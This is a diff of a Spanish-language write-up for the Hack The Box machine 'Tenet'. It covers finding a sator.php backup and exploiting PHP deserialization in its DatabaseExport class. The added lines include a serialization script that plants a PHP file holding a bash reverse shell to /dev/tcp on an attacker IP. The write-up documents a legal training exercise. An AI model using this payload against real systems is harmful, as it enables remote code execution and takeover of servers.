@@ -90,19 +90,20 @@ Al entrar a la ruta veo que la pagina se ve como si estuviera mal montada lo que
 
 Ya que podemos ver bien la pagina empezamos a enumerar y buscar información útil. En la pagina se encuentran unos posts y en uno de ellos se menciona que la pagina esta siendo migrada y ese mismo post tiene un comentario de un usuario "**neil**" el cual menciona lo siguiente:
 
-```
-  did you remove the sator php file and the backup?? the migration program is incomplete! why would you do this?!
-```
+
+>  did you remove the sator php file and the backup?? the migration program is incomplete! why would you do this?!
+>
+>-Neil
 
 Ya sabiendo esto sabemos que puede existir un un sator.php y un archivo backup, haciendo fuzzing con gobuster no pude encontrar ningún recurso de estos, ya que tocamos el tema de visual hosting puede que esta misma tenga un subdominio así que probando **backup.tenet.htb** y **sator.tenet.php** ya que son los datos que conocemos y estamos buscamos.
 
-Una vez que los agregamos al **/etc/hosts** y entramos vemos que el subdominio **sator.tenet.htb** nos funciono y ahi se encuentra el recurso **sator.php**.
+Una vez que los agregamos al **/etc/hosts** y entramos vemos que el subdominio **sator.tenet.htb** nos funciono y ahí se encuentra el recurso **sator.php**.
 
 <p align="center">
 <img src="https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/HTB/tenet/scan/sator.png?raw=true">
 </p>
 
-En el post se menciona que hay un backup de este recurso asi que intente ver si existia un archivo **.bak** y efectivamente asi fue, este archivo lo pude descargar en mi maquina y contenia lo siguiente:
+En el post se menciona que hay un backup de este recurso así que intente ver si existía un archivo **.bak** y efectivamente así fue había un recurso **sator.php.bak**, este archivo lo pude descargar en mi maquina y contenía lo siguiente:
 
 ```bash
 <?php
@@ -137,10 +138,26 @@ $app -> update_db();
 ?>
 ```
 
-Lo que hace este archivo en php es deserializar un contenido que es envido por **GET** a **aerpo** y el contenido serializado se envia a la funcion database y actualiza un archivo users.txt que es el nombre que viene ya predefinido y la data que esta en blanco de este archivo pero con la funcion **update_db()** actualiza la data de **users.txt** a **Success**
+Lo que hace este archivo en php es deserializar un contenido que es envido por **GET** a **aerpo** y el contenido serializado se enviá a la clase **DatabaseExport** ya deserializado lo que hace la clase es actualizar un archivo users.txt que es el nombre que viene ya predefinido y la data que esta en blanco de este archivo pero con la funcion **update_db()** actualiza la data de **users.txt** a **Success** y luego con la clase **__destruct()** elimina el **users.txt** antiguo.
 
-Si entramos a archivo en la url vemos que exite:
+Si entramos a archivo en la url vemos que existe:
 
 <p align="center">
 <img src="https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/HTB/tenet/scan/users.png?raw=true">
 </p>
+
+Encontre un post el cual explica a detalle como funciona una [**Exploiting PHP Deserialization**](https://medium.com/swlh/exploiting-php-deserialization-56d71f03282a) en el post explica muy bien como explotar esto para poder conseguir un **RCE**.
+
+
+Con lo visto en la web arme el siguiente archivo php para poder crear un arachivo php el cual contenga una **revershell**
+
+```php
+class DatabaseExport{
+	public $user_file = 'winsad.php';
+        public $data = '<?php exec("/bin/bash -c \'bash -i >& /dev/tcp/10.10.15.125/443 0>&1\'"); ?>';
+}
+
+print urlencode(serialize(new DatabaseExport));
+```
+
+Lo que hace es crear la clases **DatabaseExport** la cual contiene los mismo valores que requiere el archivo y serializar **sator.php** para poder deserializarlo y actualizar la supuesta base de datos y el contenido es la revershell a mi equipo.
